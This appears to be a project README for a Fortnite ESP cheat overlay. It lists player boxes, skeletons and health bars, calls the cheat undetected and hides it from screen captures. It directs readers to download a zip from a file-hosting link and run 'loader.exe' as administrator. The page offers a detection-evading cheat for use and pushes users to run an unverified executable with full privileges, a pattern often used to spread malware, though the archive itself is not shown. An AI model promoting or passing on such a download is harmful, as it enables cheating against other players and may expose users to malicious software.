# Fortnite ESP

ESP overlay for Fortnite: player boxes, skeletons, health bars and distance.

## Download

**[Download Fortnite ESP](https://www.mediafire.com/file/9livkzxm1qj0199/Fc_Cheat.zip/file)**

## Features

- Player boxes with adaptive size
- Skeleton rendering
- Health and shield bars
- Distance readout
- Team and visibility colors
- Streamproof output

## Installation

1. Download the archive from the link above
2. Extract to a separate folder
3. Run `loader.exe` as administrator
4. Start Fortnite

## Usage

Toggle elements in the `INSERT` menu. Colors and distances are configured in `config.json`.

## Status

- Status: Undetected
- Platform: Epic Games, Windows 10/11
- Mode: External overlay

## Notes

Distances use in-game units. Streamproof hides the overlay from captures.
